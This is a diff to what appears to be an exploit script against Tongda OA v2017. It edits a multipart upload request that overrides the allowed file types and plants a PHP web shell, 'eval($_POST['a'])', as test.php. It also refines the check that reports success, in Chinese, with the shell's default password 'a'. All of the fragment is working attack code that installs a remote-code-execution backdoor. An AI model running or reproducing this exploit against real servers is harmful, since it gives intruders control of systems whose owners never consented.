@@ -44,7 +44,7 @@ Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
 Content-Disposition: form-data; name="ffff"; filename="test.php"
 Content-Type: application/octet-stream
 
-<?php eval($_POST['a']) ?>
+hello<?php eval($_POST['a']) ?>
 ------WebKitFormBoundarycabltuof
 Content-Disposition: form-data; name="mufile"
 
@@ -58,7 +58,7 @@ submit
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(upload_url, headers=headers, data=data, verify=False)
         response = requests.get(url, headers=headerx, timeout=5, verify=False)
-        if upload.status_code == 200:
+        if upload.status_code == 200 and 'hello' in upload.text:
             console.print(now_time() + ' [SUCCESS]  通达OA v2017 上传webshell成功，请手动检测wbshell 默认密码为a:', style=   'bold green')
             console.print(now_time() + ' [SUCCESS]  {}'.format(url), style='bold green')
         else:
